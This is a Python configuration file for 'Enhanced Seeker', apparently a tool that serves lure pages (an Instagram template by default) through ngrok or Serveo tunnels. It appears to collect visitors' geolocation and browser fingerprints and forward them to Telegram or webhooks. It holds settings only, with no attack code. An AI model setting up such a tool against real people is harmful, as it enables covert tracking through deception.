"""
Configuration settings for Enhanced Seeker
"""

import os
from datetime import timedelta

class Config:
    # Server settings
    HOST = os.getenv('HOST', '0.0.0.0')
    PORT = int(os.getenv('PORT', 5000))
    DEBUG = os.getenv('DEBUG', 'False').lower() == 'true'
    
    # Security settings
    SECRET_KEY = os.getenv('SECRET_KEY', 'enhanced-seeker-2024-key-change-in-production')
    RATE_LIMIT = int(os.getenv('RATE_LIMIT', 100))  # requests per minute
    
    # Database settings
    DATABASE_PATH = os.getenv('DATABASE_PATH', 'seeker_data.db')
    
    # Tunnel settings
    NGROK_AUTH_TOKEN = os.getenv('NGROK_AUTH_TOKEN', '')
    SERVEO_SUBDOMAIN = os.getenv('SERVEO_SUBDOMAIN', '')
    
    # Webhook settings
    WEBHOOK_URL = os.getenv('WEBHOOK_URL', '')
    WEBHOOK_SECRET = os.getenv('WEBHOOK_SECRET', '')
    
    # Template settings
    DEFAULT_TEMPLATE = os.getenv('TEMPLATE', 'instagram')
    CUSTOM_TITLE = os.getenv('CUSTOM_TITLE', '')
    CUSTOM_IMAGE = os.getenv('CUSTOM_IMAGE', '')
    CUSTOM_REDIRECT = os.getenv('CUSTOM_REDIRECT', 'https://google.com')
    
    # Analytics settings
    RETAIN_DATA_DAYS = int(os.getenv('RETAIN_DATA_DAYS', 30))
    ENABLE_ANALYTICS = os.getenv('ENABLE_ANALYTICS', 'True').lower() == 'true'
    
    # Telegram integration
    TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
    TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
    
    # Accuracy thresholds
    HIGH_ACCURACY_THRESHOLD = int(os.getenv('HIGH_ACCURACY_THRESHOLD', 50))  # meters
    MEDIUM_ACCURACY_THRESHOLD = int(os.getenv('MEDIUM_ACCURACY_THRESHOLD', 100))  # meters
    
    # Feature flags
    ENABLE_FINGERPRINTING = os.getenv('ENABLE_FINGERPRINTING', 'True').lower() == 'true'
    ENABLE_TUNNELING = os.getenv('ENABLE_TUNNELING', 'True').lower() == 'true'
    ENABLE_WEBHOOKS = os.getenv('ENABLE_WEBHOOKS', 'True').lower() == 'true'
    
    # Session settings
    SESSION_TIMEOUT = int(os.getenv('SESSION_TIMEOUT', 3600))  # seconds
    MAX_SESSIONS = int(os.getenv('MAX_SESSIONS', 1000))
    
    # Logging settings
    LOG_LEVEL = os.getenv('LOG_LEVEL', 'INFO')
    LOG_FILE = os.getenv('LOG_FILE', 'seeker.log')
    
    @classmethod
    def validate(cls):
        """Validate configuration settings"""
        errors = []
        
        if cls.PORT < 1 or cls.PORT > 65535:
            errors.append("PORT must be between 1 and 65535")
            
        if cls.RATE_LIMIT < 1:
            errors.append("RATE_LIMIT must be positive")
            
        if cls.RETAIN_DATA_DAYS < 1:
            errors.append("RETAIN_DATA_DAYS must be positive")
            
        return errors
